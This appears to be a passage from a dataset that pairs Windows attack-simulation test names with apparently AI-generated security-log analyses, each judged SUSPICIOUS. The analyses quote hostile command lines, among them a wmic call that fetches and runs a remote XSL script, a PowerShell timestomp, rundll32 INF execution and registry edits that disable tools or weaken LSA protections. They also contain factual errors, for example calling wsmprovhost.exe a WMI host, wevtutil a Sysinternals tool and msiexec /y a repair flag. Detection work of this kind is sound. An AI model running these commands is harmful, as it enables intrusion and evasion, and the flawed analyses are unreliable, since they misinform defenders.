2. Verify the legitimacy of `admin_test` account access during the given timeframe.
3. Conduct a thorough inspection for any signs of system compromise or unauthorized changes.
4. Consider employing threat detection tools to monitor for abnormal account behaviors and unauthorized privilege escalations.

**Resolution:** SUSPICIOUS – This activity warrants further investigation due to the potential of malicious intent."
System Binary Proxy Execution - Wlrmdr Lolbin,"In analyzing the provided logs, several aspects stand out as either routine or potentially suspicious activity:

1. **Routine and Expected Activities**:
   - The Sysmon logs show multiple executions of known Windows utilities like `wevtutil.exe`, `conhost.exe`, `wevtutil.exe`, `svchost.exe`, and `MicrosoftEdgeUpdate.exe`. These processes are normal components and their execution doesn't inherently indicate malicious activity. The presence of `MicrosoftEdgeUpdate.exe` is expected in environments where Microsoft Edge is installed and frequently updates.

2. **Command Execution Logs**:
   - In the Sysmon logs, there are entries showing the execution of `whoami`, `hostname`, and `powershell.exe` commands. While these can be used diagnostically, the specific PowerShell command found (`wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u ""C:\Windows\System32\calc.exe""`) is worth noting.
   - The initiation of PowerShell to execute the `wlrmdr.exe` program followed by launching `calc.exe` is not standard behavior. This command executes an unspecified functionality wrapped under a PowerShell command, often a technique used by attackers to disguise malicious code execution under the guise of legitimate tools.

3. **Time Synchronization Events**:
   - The System and Security logs show time synchronization events involving `svchost.exe`. While this is typically a benign operation related to synchronizing system time, the timestamp of the adjustment should be monitored to ensure it aligns with organization policies or schedules.

4. **Privileged Activities and Logon Events**:
   - There are security events indicating privileged operations, including several logon events with elevated privileges (Event ID 4624 and 4672). The user ""admin_test"" is shown to log on using an NTLM authentication package from an external workstation (`DESKTOP-3HL5B2P`). While this might occur under legitimate circumstances, it's vital to confirm that the associated IP and workstation are expected in the environment and that the admin_test account usage is typical for the task.

**Assessment**:
- **SUSPICIOUS**: There is a need to delve deeper into specific activities, notably:
  - The PowerShell invocation with `wlrmdr.exe` and subsequent execution of `calc.exe`.
  - Verify if the `admin_test` account's usage pattern and origin align with authorized operational behaviors.
  - Check if there are any reports of misconfigurations or defects involving `wlrmdr.exe` that could potentially explain its presence aside from being a potential threat vector.

**Guidance on How to Proceed**:
- Examine network logs and any further context regarding communications associated with the external IP (`192.168.0.102`).
- Conduct a behavioral analysis to gather insights into any file modifications or unexpected access following the suspicious activities.
- Consider isolating the machine associated with `wlrmdr.exe` execution for immediate threat containment and conduct a thorough scan for any malicious payloads.
- Review IT and HR records to verify if actions associated with the `admin_test` user account align with expected administrative tasks."
Windows - Modify file last modified timestamp with PowerShell,"### Detailed Analysis of the Logs

1. **PowerShell Timestomp Activity:**

   - The PowerShell logs show a script altering the last write time of a file (`data.006_timestomp.txt`) to `01/01/1970 00:00:00`, which is often referred to as the ""UNIX epoch time"". This activity is commonly known as ""Timestomping"", a technique used by attackers to change timestamps of their malicious files to evade detection by forensic tools.

   - Script Extract:
     ```plaintext
     powershell.exe & {Get-ChildItem ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\data.006_timestomp.txt"" | %{ $_.LastWriteTime = ""01/01/1970 00:00:00"" }}
     ```

   - This PowerShell activity is considered suspicious and potentially indicative of an attempt to manipulate file timestamps to hide malicious activity.

2. **Sysmon Logs:**

   - The Sysmon logs corroborate the execution of the PowerShell script by showing the processes related to it:
     - Execution of `powershell.exe` by the user `SERVER002\admin_test`.
     - Related process executions include `conhost.exe`, which typically accompanies command-line applications.

   - Process creation from `wsmprovhost.exe` suggests that these activities may have originated from a WMI provider host, which is unusual for regular operations and raises the suspicion of misuse of WMI for script execution.

3. **Microsoft Edge Updates:**

   - The Sysmon logs also show activities related to updating Microsoft Edge. This includes `MicrosoftEdgeUpdate.exe`, `MicrosoftEdge_X64_130.0.2849.46_129.0.2792.89.exe`, and associated `setup.exe` processes. While normally benign as part of regular browser updates, it’s crucial to differentiate these standard update processes from abnormal updates potentially injected with malicious content.
   
   - Examination of these logs suggests no irregularities with these processes, as they align with typical software update activities performed by the `NT AUTHORITY\SYSTEM` user, which is a trusted system context.

### Assessment of the Situation

- **Suspicious Activity Identified:**
  - The PowerShell operation indicating ""Timestomping"" is suspicious and typically indicative of malicious intent to obfuscate the modification times of files as a potential evasion technique.
  
- **Other Processes:**
  - Activities linked to Edge updates appear benign and consistent with legitimate software update operations expected in a Windows environment.

### Resolution and Guidance

- **Resolution:** **SUSPICIOUS**

- **Guidance:**
  - A deeper investigation into the context around the PowerShell script execution is recommended. Specifically, understand why `admin_test` is executing such commands, and check if this is part of scheduled or automated tasks that were mistakenly set up or if unauthorized access occurred.
  - Conduct a forensic examination of the file `data.006_timestomp.txt` to determine its origin, purpose, and if it contains malicious content.
  - Review user activity, any recent changes to administrative accounts, and check for other occurrences of timestamp modifications on files.
  - Ensure endpoint security measures are up-to-date to prevent potential future misuse of PowerShell scripts and WMI for malicious purposes.

- **Consider Enhancing Monitoring:** Implement more stringent monitoring to detect and alert on the use of PowerShell and WMI in a potentially malicious manner across the infrastructure."
WMIC bypass using remote XSL file,"Upon reviewing the logs provided, the following observations have been made:

1. **Repeated Execution of System Utilities**: The logs show repeated execution of standard Windows utilities like `wevtutil.exe` and `conhost.exe` with the user `SERVER002\admin_test`. While `wevtutil.exe` is used for managing Windows event logs, and `conhost.exe` is a console host process for command-line interfaces, their repeated execution in quick succession is unusual behavior if not part of a deliberate administrative task.

2. **Execution of Command Prompt and Remote Script**: The execution of `cmd.exe` with a command line parameter that requests the download of a script (`wmic process list /FORMAT:""https://raw.githubusercontent.com/file/file-file/master/files/data/src/wmicscript.xsl""`) is highly suspicious. This indicates an attempt to potentially run remote scripts via Windows Management Instrumentation (WMI), which is a known technique for lateral movement or further compromise in a network.

3. **Privilege Escalation Events**: Security logs indicate that the user `admin_test` obtained an array of high-level privileges (`SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege`). While these are typically available to administrative users, their acquisition should be confirmed as intentional and not part of malicious activity.

4. **Time Anomalies**: There are system events where the time was changed and reset. Such discrepancies in timestamps indicate time manipulation, often used to obfuscate the tracks of malicious activity by messing with logging timelines.

5. **Hostname and Whoami Commands**: Commands such as `hostname.exe` and `whoami.exe` were executed. While these can be part of normal administrative checks, in context with the suspicious script downloading via WMI, they might have been used to gather system information for malicious purposes.

**Assessment**: 
Based on the above logs, there are strong indicators of potentially malicious activity, particularly with the use of command scripts from an external URL and privilege escalation events. While some actions could appear benign in a legitimate campaign for system health checks or maintenance tasks, the combination and sequence point towards actions that are consistent with techniques used in exploitation or post-exploitation phases.

**Resolution**: SUSPICIOUS

**Guidance on How to Proceed**:
- Conduct a thorough investigation into the user `admin_test`'s activities and confirm whether the actions were legitimate.
- Check for any abnormal network traffic originating from or directed towards the external URL hosting the script.
- Perform a comprehensive malware and threat scan to ensure no rogue scripts or software are present.
- Review firewall and network logs for any unauthorized access attempts or anomalous behavior correlating with the time of these events.
- Consider tightening security policies around script execution and network access to further reduce potential entry points for threat actors.
"
DisallowRun Execution Of Certain Applications,"## Detailed Analysis:

### Overview:
The Sysmon logs provided evidence of extensive process activity originating from a user account named `SERVER002\\admin_test`. The processes executed appear to involve a series of typical Windows system utilities including `wevtutil.exe`, `conhost.exe`, `svchost.exe`, `reg.exe`, and `cmd.exe`, among others. However, a detailed analysis of the command-lines used and the sequence of executed processes can reveal insights into potentially suspicious behavior. 

### Suspicious or Anomalous Behavior:
1. **Wevtutil.exe Execution**:
    - `wevtutil.exe` is a legitimate Windows tool used to manage event logs. Its frequent consecutive execution, without a clear task specified, can be an indicator of log manipulation or gathering attempts common in various attack stages.

2. **Execution of command-line utilities with elevated privileges**:
    - The processes such as `svchost.exe`, `cmd.exe`, and `reg.exe` by `SERVER002\\admin_test` with a high integrity level indicate potential misuse for unauthorized operations.
    - Particularly, the use of `cmd.exe` with complex command-line instructions to modify registry keys using `reg.exe` suggests an attempt to alter system policies:
        ```
        cmd.exe /c reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v DisallowRun /t REG_DWORD /d 1 /f & reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /f /t REG_SZ /v art1 /d ""regedit.exe"" & reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /f /t REG_SZ /v art2 /d ""cmd.exe""
        ```
    - This command sequence specifically aims to add registry values under `DisallowRun`, a policy used to restrict the usage of particular executables, often employed for persistence or disabling certain tools during a compromise.

3. **Unusual Execution Patterns**:
    - The processes originate frequently from `wsmprovhost.exe`, which indicates potential remote command execution through WSM (Windows Service Management) implying unauthorized remote access can be involved.

### Malicious Activity Indications:
While some of these tools are part of normal administrative tasks, their combined presence and particularly the registry modifications through command-line point towards potentially malicious activities. These steps resemble known tactics employed by attackers to maintain persistence, gather information, or evade defenses.

### Assessment:
- **Indicators of Compromise**: The pattern and order of executed processes, registry modifications from the command-line, repeated usage of certain utilities in quick succession (especially `reg.exe`), and use under a typical administrative user account with high privilege levels are strong indicators of potentially unintended, suspicious activity.

### Resolution:
Given the activities and the indicators present in the provided logs, the potential for malicious intent exists but without conclusive evidence of direct malicious harm (e.g., downloading or executing payloads). 

**Classification**: **SUSPICIOUS**

### Guidance:
1. **Immediate Steps**:
   - Investigate the origin of the activity pertaining to the `SERVER002\\admin_test` account. Determine if it was authorized or if credentials may have been compromised.
   - Cross-check registry changes and restore affected keys to a known good state if unauthorized modification is confirmed.
   - Validate the integrity and current status of critical system files and policies that the logs may have tried to influence.

2. **Follow-up Actions**:
   - Implement enhanced monitoring on `SERVER002` and verify any other systems potentially accessed by the same user account or with similar patterns.
   - Confirm any ongoing suspicious processes on `SERVER002` and consider isolating impacted systems from the network if broader investigation necessitates it.
   - Conduct a thorough review of access and authentication logs around the timeframe of identified activities to ascertain broader system impacts.

3. **Long-term Strategies**:
   - Review and implement least privilege principles across administrative accounts.

Mimic Ransomware - Enable Multiple User Sessions,"Upon reviewing the provided logs from the Windows event logs, here is the detailed analysis of the findings:

1. **Sysmon Logs**:
   - Multiple instances of `wevtutil.exe` and `conhost.exe` are executed by the user `SERVER002\\admin_test`. While `wevtutil.exe` is a legitimate tool used for managing event logs and `conhost.exe` is the Console Window Host, continual usage could potentially be leveraged for malicious activities, such as clearing event logs.
   - A noteworthy log entry is the execution of `cmd.exe` with the command to modify the Windows Registry:
     ```
     ""cmd.exe"" /c reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Winlogon /t REG_DWORD /v AllowMultipleTSSessions /d 1 /f
     ```
     This registry change allows multiple Terminal Services sessions which could be a technique for persistence or unauthorized access.
   - Usage of `hostname.exe` and `whoami.exe` could be indicative of reconnaissance activity.

2. **Security Logs**:
   - Time changes recorded (EventID 4616) without clear justification can sometimes indicate an attempt to alter system logs or timestamps to hide tracks.

3. **Application and System Logs**:
   - No immediate indicators of compromise are found in the application logs.
   - System logs involving time synchronization (`svchost.exe` related to time service) align with the security logs indicating time change events.

**Suspicious and Anomalous Behavior**:
- The use of command line scripts to modify registry settings is suspicious. It is often used in malicious scripts to maintain access or modify system behavior for nefarious purposes.
- The time alteration events should be further explored as they can be part of a cover-up for malicious actions, although no direct link can be inferred from the current logs.

**Assessment**:
- There are entries indicating suspicious behavior, particularly the unauthorized registry modification which could signify an attempt to enable persistence or facilitate unauthorized access.
- The timing and frequency of these entries could indicate a script or an automated task.

**Resolution**:
- **SUSPICIOUS**: The activity in the logs does not conclusively prove malicious intent, but it does raise enough red flags to warrant further investigation. The registry modification, in particular, is not typical for standard operations and should be investigated further to understand the origin and intent. A deeper inspection of user `SERVER002\\admin_test` activities and context for these registry modifications should be prioritized.

**Guidance**:
1. Investigate the source and intention of the registry modification.
2. Verify the authenticity and roles of the user `SERVER002\\admin_test` and assess for any abnormal patterns relative to their usual activities.
3. Review other system or network logs to determine if there are further correlating evidence of suspicious activities.
4. Monitor for any subsequent changes to system configurations or suspicious activities occurring from the same user or system."
Rundll32 ieadvpack.dll Execution,"Upon detailed analysis of the provided log entries, several patterns and events stand out which require closer scrutiny:

### Key Observations:
1. **Frequent Execution of Sysinternals Utilities**:
   - The logs indicate frequent execution of `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe`. While these utilities can be utilized for system management, their frequent execution in quick succession could also indicate malicious activities such as information gathering or log clearance attempts.

2. **Suspicious Command-Line Execution**:
   - A particularly suspicious command is executed with `cmd.exe` involving `rundll32.exe` using `ieadvpack.dll` to launch an INF file from a temporary directory:
     ```
     ""cmd.exe"" /c rundll32.exe ieadvpack.dll,LaunchINFSection ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.011\src\data.011.inf"",DefaultInstall_SingleUser,1,
     ```
     This behavior is indicative of potential malware execution or persistence mechanisms attempting to leverage legitimate system processes for execution.

3. **Sysinternals Tools Use**:
   - While the use of Sysinternals tools like `wevtutil.exe` could indicate legitimate administrative actions, taken in the context of the suspicious command-line activity above, it adds a layer of suspicion. These tools are often used by attackers for information gathering, clearing event logs, or persistence.

4. **Privilege Escalation Indicators**:
   - Numerous Event ID 4672 entries indicate the usage of high-level privileges, which might be normal for system processes but should be carefully reviewed in conjunction with other suspicious activities for potential unauthorized privilege use.

5. **Batch Execution of Microsoft Edge Updates**:
   - The logs feature extensive logs pertaining to `MicrosoftEdgeUpdate.exe`. Although product updates are routine, running from temporary directories and registering components through COM servers should be verified for legitimacy in this instance.

### Assessment:
Given the above observations, the logs contain several **Indicators of Compromise (IoCs)**:
- The suspicious execution of `rundll32.exe` to run scripts from temporary directories.
- Abnormal patterns related to frequent, varied tool executions, potentially indicative of reconnaissance, privilege escalation, or persistence attempts.
  
### Resolution
Based on the evidence and suspicious behaviors identified:

- **Resolution: SUSPICIOUS**  
  The activities logged, particularly the unconventional use of `rundll32.exe` and a sequence of system utility executions, warrant further investigation. Dig deeper into:
  - The source of INF files executed via `rundll32.exe`.
  - The legitimacy of actions being taken by the elevated processes.
  - Compare timestamps and correlate these logs with any other potential system anomalies or alerts on the specific server involved.

### Guidance on How to Proceed:
1. **Cross-Verify with Additional Logs**:
   - Examine additional Windows logs such as Application, Security, and System for corroborative or contradictory evidence, focusing on the aforementioned timestamps.
   
2. **Conduct Threat Intelligence Query**:
   - Check the hash of suspicious files and executed binaries through threat intelligence platforms to see if they are associated with known malicious activity.

3. **Endpoint Security Review**:
   - Run endpoint security tools to check for anomalies or threats on the affected server.
   
4. **User Activity Review**:
   - Investigate user `admin_test` activities around the highlighted timeline for unauthorized or inconsistent access patterns.

5. **Network Traffic Analysis**:
   - Conduct an analysis of network logs to search for unusual outbound traffic or communication with known bad IP addresses.

In summary, while not definitively malicious, the activities captured within the logs present a pattern of potential risk that should be promptly addressed and verified to ensure the security of the environment."
Create Hidden Directory via $index_allocation,"Based on the provided logs, here is an analysis of the observed activities:

1. **Time Change Events**: There are multiple events indicating changes in system time. Event ID 4616 from the Security log and Event ID 1 from the System log both show time adjustments. These events are triggered typically by system or service requirements, like synchronization with an NTP server, which is noted in the System log to be `time.windows.com`. Time changes are not inherently suspicious unless they are done frequently and without a valid reason. Here, since synchronization events with an NTP server are visible, this might still be considered normal behavior.

2. **Process Execution Events with Sysmon**:
   - **HOSTNAME.EXE** and **CONHOST.EXE**: These processes appear consistent with standard activities. Conhost.exe, for instance, is a normal system process related to the console host.
   - **WHOAMI.EXE** and repeated instances of **conhost.exe**: The 'whoami' command is usually benign if done by an administrator. Its usage here suggests information gathering about user permissions and identity.
   - **CMD.EXE with Unusual Arguments**: The command line for `cmd.exe` is using alternative data streams (`::$index_allocation`) to create a directory and file, which is not typical activity. This could indicate obfuscation or an attempt to hide information/files. This behavior is consistent with potential unauthorized data exfiltration or hideout.
   - **MicrosoftEdgeUpdate.exe and TiWorker.exe**: These are legitimate processes related to system and software updates.

3. **Wevtutil.exe Usage**: 
   - This utility, which interacts with Windows event logs, is typically used by administrators or for scheduled maintenance. However, frequent or abnormal use can indicate that an attacker might be clearing logs to hide their tracks.

4. **Security Context**:
   - The majority of processes are executed with ""SERVER002\\admin_test"" privileges and with high integrity level, indicating administrative access. This is common for legitimate administrator tasks but must be ensured not to bypass security policies.

5. **Background Noise vs. Indicators of Compromise (IoC)**: 
   - While many processes could be part of normal administrative activities, the unusual `cmd.exe` with `::$index_allocation`, and the frequent querying of user information through `whoami.exe`, coupled with potential log manipulation through `wevtutil.exe`, suggest activities that could be part of data concealment or reconnaissance.

### Assessment
- **SUSPICIOUS**: The combination of the command line involving alternative data streams, frequency of user info queries, and possible manipulation of event logs using `wevtutil.exe` requires further investigation. These actions are out of the norm for typical system operations and administrative tasks.

### Recommendations
1. **Review User Activities**: Cross-reference ""SERVER002\\admin_test"" activities with legitimate job roles and tasks.
2. **Monitor for Repeated Patterns**: Set up alerting for further use of commands involving alternative data streams, unexpected whoami executions, and wevtutil usage.
3. **Conduct a Baseline Comparison**: To determine if the observed behaviors align with historical patterns for this system and user.
4. **Threat Hunting**: Conduct proactive threat hunting using the mentioned IoCs as starting points to rule out potential breaches.
5. **Review Incident Response Plan**: Ensure readiness to respond if these anomalies develop into confirmed malicious actions."

1. **Process Execution:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` executed by `SERVER002\admin_test`.
   - Controlled executions of `hostname.exe`, `whoami.exe`, and commands to modify Windows registry settings using `cmd.exe` and `reg.exe`.
   - Continuous execution of `MicrosoftEdgeUpdate.exe` including its services and support utilities.

2. **Registry Modification:**
   - `cmd.exe` running with the command to add a registry key under `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer` to hide the clock. This might be considered suspicious as it can be associated with preventing users from quickly checking time, but it is also not inherently malicious by itself without a wider context.

### Anomalous or Suspicious Behavior:
- **Registry Modification:** 
  - The action of hiding the clock in the system tray via registry modification is somewhat unusual and could be part of a script or administrative task. However, in a security scope, it could be considered suspicious if the intent is to obscure system state awareness or to accompany other malicious tasks.
  
- **Process Execution Context:**
  - Various administrative tools like `wevtutil.exe`, `hostname.exe`, and `whoami.exe` are executed. These could be used for log management, system identification, and user knowledge, respectively. Such activities can be part of both legitimate administrative tasks and reconnaissance by an attacker.
  
### Malicious or Benign Assessment:
- **Registry Changes by `cmd.exe`:** The suspicious change to the system’s registry via a command executed by `cmd.exe` does indicate potentially unauthorized changes to user-interface settings, which could be leveraged in broader malicious activity.
- **Account Performing Actions:** The actions are being executed under an administrative account (`SERVER002\admin_test`), suggesting possibly authorized or at least potential privilege misuse.

### Conclusion and Next Steps:
- **Assessment Resolution: ** **SUSPICIOUS** - The logs reveal some suspicious behavior, particularly with the emphasis on registry changes and frequent use of command utilities in a potentially unconventional capacity. It is advisable to further investigate the context of these activities.

### Guidance:
- Conduct an audit to determine if the registry changes have been authorized.
- Check for any additional signs of lateral movement or data exfiltration.
- Review user account (`SERVER002\admin_test`) activities for any anomaly or improper access patterns.
- Ensure system documentation and logs align with expected administrative changes.
- Potentially increase monitoring of the system and user activities to capture any further suspicious actions.

In conclusion, the activities observed require more context-specific investigation to rule out or confirm malicious intent, given the alterations to system-level settings under administrative privileges."
WMI Win32_Product Class - Execute Local MSI file with an embedded DLL,"In reviewing the provided Windows event logs, certain observations and potential security concerns have been identified. Here's the analysis broken down by categories relevant to potential malicious activity:

### Analysis:

#### 1. Application Logging:
- **MsiInstaller Events (EventID 1040, 11707, 1042, 1033):** 
  The installation events were logged for a program installed from the path `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.007\\bin\\data.007_DLL.msi`. Temporary directories, especially in an unverified folder like `data.007`, can occasionally be associated with malware or unauthorized software installations. The binary/unknown character sequences logged may suggest attempts to obfuscate or encode information associated with this installation.

#### 2. Sysmon Logging:
- **Execution of PowerShell and Other Utilities (EventID 1, 5):** 
  There were multiple instances of PowerShell (`powershell.exe`) and other command-line utilities like `whoami.exe` and `hostname.exe` being executed. While utilities like `whoami` and `hostname` are legitimate, their usage in combination with PowerShell, especially with command lines like `""powershell.exe -nop -Command Write-Host CustomAction export executed me; exit""`, can be indicative of scripted or automated activities often present in attack vectors or unauthorized administrative changes.

- **High Integrity Level Execution:** 
  Most activities were carried out at a High Integrity Level, suggesting administrative privileges. If unauthorized, such privilege utilization could signify a deliberate attempt to access or alter system configurations or data.

#### 3. Windows PowerShell Logging:
- **PowerShell Script Block Events (EventID 600, 400, 403):** 
  The PowerShell logs echo the execution of suspicious commands and scripts with parameters like `-nop` (No Profile). This is often used in PowerShell attacks to bypass or minimize detection by security software that monitors for script-based threats.

#### 4. Edge Update Activity:
- **Microsoft Edge Update Activity:**
  The frequent triggering of `MicrosoftEdgeUpdate.exe` processes is noted. While updates are regular maintenance tasks, it is curious due to lack of information presented that there's simultaneous execution and log entries with details emphasizing folder paths like `Microsoft\\Temp\\EUDDC3.tmp`, which seem unrelated to typical Edge Update directories.

### Assessment:

Based on this aggregation of indicators, the logged activities reflect concerning behavior characteristic of potentially malicious activity. The execution of PowerShell with administrative privilege, script execution with non-standard flags, and use of temporary directories for installation suggests the need for further investigation.

### Resolution:

- **Resolution: SUSPICIOUS**  
  The activity does not conclusively confirm malevolent intent, but contains enough anomalies to merit a closer inspection. Further steps might include:
  - Conducting a detailed forensic examination of the `C:\Users\ADMIN_~1\AppData\Local\Temp\file\` directory.
  - Checking user account activities and verifying the legitimacy of programs and scripts executed.
  - Monitoring for further unusual process creations logged by Sysmon and reviewing security configurations and system access logs for unauthorized changes.  
  - Running antivirus and anti-malware scans focused especially on the Temp directories and recent executable files.

The anomalous activities logged suggest that further investigation is warranted to ensure system integrity and security."
Activate Windows NoPropertiesMyDocuments Group Policy Feature,"After analyzing the provided Windows event logs, I have identified the following observations:

### Key Observations:

1. **Time Change Events:**
   - The logs indicate a series of events where the system clock was adjusted. This is seen in multiple logs indicating both ""OldTime"" and ""NewTime"" entries, primarily managed by the `svchost.exe` process. These are likely related to time synchronization activities with `time.windows.com`. No evidence suggests intentional tampering by a user or malicious activity associated with these changes.

2. **Registry Modification via cmd.exe and reg.exe:**
   - A `cmd.exe` process was executed with the command line altering registry settings: 
     ```
     reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoPropertiesMyDocuments /t REG_DWORD /d 1 /f
     ```
   - This behavior is noteworthy as it can be a method used by malware for persistence or altering user policies. Note that the activity was executed under `SERVER002\admin_test` with a high-integrity level, which implies it ran with elevated privileges. This warrants further investigation to understand the context of this change.

3. **Execution of Whoami and Hostname:**
   - The processes `whoami.exe` and `hostname.exe` were executed in quick succession. While not inherently malicious, such commands can be used by attackers to gather system information post-compromise.

4. **Edge Update Processes:**
   - Numerous instances of Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`) are logged. These logs depict normal update activity characteristic of Microsoft Edge, starting, executing update tasks, and stopping. The integrity level and execution path align with genuine update mechanisms.

5. **Use of wevtutil and conhost:**
   - Multiple executions of `wevtutil.exe` and `conhost.exe` are recorded. These are standard Windows tools used for event log management and console applications respectively. The high frequency of their appearance suggests log or environment examinations, possibly script-driven.

### Assessment:

- **Benign:** Most activities appear routine and are part of regular system operations such as time synchronization, software update via Microsoft Edge, and other standard utility executions.
  
- **Suspicious:** The registry modification is suspicious and warrants additional inquiry. Although `reg.exe` changes are common in administrative tasks, their association with command-line use under a possibly unauthorized context raises concern. Confirm if the `admin_test` user legitimately performed this modification or if this account might be compromised.

### Resolution:

**SUSPICIOUS**: While most log entries are benign, the cmd.exe initiated registry change needs further investigation to ensure no unauthorized configuration was deployed by a potential threat actor trying to establish persistence or alter system behaviors. 

### Next Steps:

1. **Verify User Intent:** Contact the account owner of `SERVER002\admin_test` to confirm whether these registry changes were intentional and authorized.
2. **Review System Integrity:** Conduct a thorough system scan focusing on malware detection and unusual registry entries or modifications.
3. **Audit Account Activity:** Examine previous and subsequent activity by `SERVER002\admin_test` for signs of unusual or unauthorized behavior.
4. **Consider Enhanced Logging:** Enable enhanced logging to capture full command-line arguments and command history to facilitate thorough forensic analysis. 

These steps will help ascertain the context and intent behind the registry modification and establish if further security interventions are necessary."
Msiexec.exe - Execute the DllRegisterServer function of a DLL,"Upon analyzing the provided event logs, I have the following observations:

1. **Frequent Use of Standard Utility Commands:**
   - The logs show multiple executions of standard system utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe`. These tools are legitimate Windows utilities.
   - The commands executed like `whoami` and `hostname` could be used as reconnaissance tools often seen in attack scenarios. However, they are frequently used by administrators in typical operations.

2. **MSIRunner DLL Execution:**
   - There's a Sysmon event indicating the execution of `msiexec.exe` with a DLL `MSIRunner.dll` from a temporary path, which is suspicious as it can be indicative of DLL sideloading or malicious installations.
   - The command `cmd.exe /c c:\windows\system32\msiexec.exe /y ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.007\bin\MSIRunner.dll""` is observed, and the temporary path along with the `/y` flag (which forces a repair) adds to the suspicion.

3. **User Context:**
   - Many processes are running under the `SERVER002\\admin_test` user context, which might be an administrative account based on the naming. Use of such an account with high integrity level raises concerns.
   - Anomalies are mainly centered around the activities of this user account. Administrative users generally have broader permissions that can be leveraged during an attack.

4. **Edge Update and Installation Activities:**
   - The logs record the activities of Microsoft Edge updates and installations. While these are legitimate processes, it's important to check if updates were authorized and expected during this period to rule out any hidden actions under the guise of legitimate processes.

5. **Lack of Indicators for External Connections or Downloads:**
   - The logs do not suggest any direct indication of external communications or downloads. If the intent were exfiltration or command-and-control activities, these might be present.

### Assessment:
- **Suspicious:** The activities surrounding msiexec and temporary directories are suspicious, especially if there are no authorized updates or installer activities on the server at that time. Though system utilities can be misused for malicious purposes, there lacks definitive evidence of compromise in these logs alone. The behavior merits further investigation.

### Guidance on How to Proceed:
1. **Verify Recent Installs/Updates:**
   - Check for any authorized installations or updates corresponding to the `msiexec` usage. Validate the legitimacy of `MSIRunner.dll`.

2. **Audit User Activity:**
   - Investigate the `admin_test` user's activities for any known changes or maintenance work that involve utilities and assess the need for elevated permissions.

3. **Review Edge Update Process:**
   - Confirm that the Microsoft Edge update logs correspond with your update schedule or policy to ensure they were expected and valid.

4. **Suspicious File Path:**
   - Analyze the contents of the `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.007\bin\` directory and investigate if the files comply with all known authorized software.

5. **Conduct Comprehensive Review:**
   - Use endpoint detection tools or antivirus scans to look for abnormal behaviors or compromise indicators related to `dll` execution and command-line activities.

Based on the available evidence, the verdict is **SUSPICIOUS**. Further corroborative evidence should be gathered before concluding any malicious activity."
Create and Hide a Service with sc.exe,"Here is a structured assessment of the provided Windows event logs:

### Suspicious and Anomalous Activities:

1. **Event Log Time Change:**
   - Two security events (Event ID 4616) indicate a change in system time by the `LOCAL SERVICE` account. Frequent or suspicious time changes can point towards an attempt to evade detection or manipulate log timestamps, an indication of potential tampering.

2. **Event ID 4672 - Special Privileges Assigned:**
   - The log shows ""admin_test"" being granted a comprehensive set of privileges, including `SeDebugPrivilege`, which allows for the debugging of processes and can be leveraged for malicious activities.

3. **Service Creation with `calc.exe`:**
   - Sysmon logs and System logs detail the creation of a service named `fileService` with the image path pointing to `C:\Windows\System32\calc.exe`. This usage is unconventional and highly suspicious as `calc.exe` is not a service-related application.
   - The `sc sdset` command sets discretionary access on the service, possibly modifying permissions in an atypically complex manner.

4. **Processes Spawning Unexpected Applications:**
   - There are multiple instances of the `wevtutil.exe` and `conhost.exe` processes being executed by the `admin_test` user, recorded by Sysmon logs. Wevtutil usage might indicate log query or manipulation intentions.
   - Execution of `HOSTNAME.EXE` and `whoami.exe` indicates system reconnaissance actions, typically seen when an attacker attempts to gather system information.

5. **Frequent Execution of Edge Update:**
   - A number of executions of Microsoft Edge Update and related components are seen in a short span. While this can result from regular update activities, the frequency and chaining of these processes could suggest misuse or hiding malicious activities amidst genuine operations.

### Resolution:
Considering the points noted above, the presence of an unusual service creation utilizing a benign executable and time modification activity typically not associated with normal operations, the logs present sufficient suspicious activities that require further investigation.

- **Network Traffic Analysis:** Analyze network logs and traffic to identify communication patterns that might correlate with command and control activity or data exfiltration."
Enabling Restricted Admin Mode via Command_Prompt,"### Detailed Analysis of the Logs:

1. **Time Discrepancy (Event ID: 4616)**:
   - **Observation**: There are events indicating a change in system time. The time was set back slightly on the system (Security Logs, Event ID 4616).
   - **Potential Implication**: Adjustments to system time can be legitimate (e.g., synchronization issues) or could potentially be indicative of an attempt to manipulate time-stamped logs to cover tracks of malicious activities. However, there is no obvious follow-up action indicating abuse of this time change for malicious purposes.
   - **Assessment**: Require further investigation to determine the reason for the adjustment; however, this alone, without accompanying suspicious activity, doesn't confirm malicious intent.

2. **Process Execution (Sysmon Event ID: 1 & 5)**:
   - **Observation**: Processes such as `cmd.exe`, `reg.exe`, `whoami.exe`, and `MicrosoftEdgeUpdate.exe` were executed:
     - Command executed via `cmd.exe`: `reg add ""hklm\system\currentcontrolset\control\lsa"" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0`
     - Execution of system binaries `wevtutil.exe`, `conhost.exe`, and `whoami.exe` under the user `admin_test`.
     - Frequent updates and executions related to Microsoft Edge Update.
   - **Potential Implication**: The `cmd` command modifies system registry regarding ""DisableRestrictedAdmin"", potentially indicating a change that could affect system security posture. Use of `reg.exe` to alter registry settings might be suspicious and deserves further verification of context. The `whoami.exe` execution is commonly used to verify user context and might not be inherently malicious.
   - **Assessment**: The registry modification action is particularly suspicious and merits investigation to determine if it aligns with authorized administrative activities.

3. **Edge Update Activity**:
